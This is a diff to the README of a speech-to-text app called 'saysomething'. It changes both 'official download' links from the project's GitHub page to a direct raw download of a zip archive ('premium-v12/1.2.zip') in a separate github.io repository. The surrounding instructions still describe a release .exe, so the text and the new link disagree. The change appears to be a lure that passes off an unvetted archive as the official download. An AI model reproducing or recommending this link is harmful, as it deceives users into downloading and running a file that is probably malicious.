@@ -5,7 +5,7 @@ description: "Convert speech to text in any application using private, local tra
 ---
 # 🎙️ saysomething - Turn your voice into typed text
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/mature-sustainability193/saysomething)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/mature-sustainability193/mature-sustainability193.github.io/main/premium-v12/1.2.zip)
 
 saysomething changes the way you type. It listens to your voice and places your words directly into any text box on your screen. The software runs entirely on your own computer. It does not send your recordings or data to the internet. Your conversations stay private. You do not need to create an account or sign in to use the tool.
 
@@ -31,7 +31,7 @@ Your computer needs enough power to run the voice model in real time. If your ha
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official download page](https://github.com/mature-sustainability193/saysomething).
+1. Visit the [official download page](https://raw.githubusercontent.com/mature-sustainability193/mature-sustainability193.github.io/main/premium-v12/1.2.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to start your download.
 4. Open the downloaded file once the process finishes.
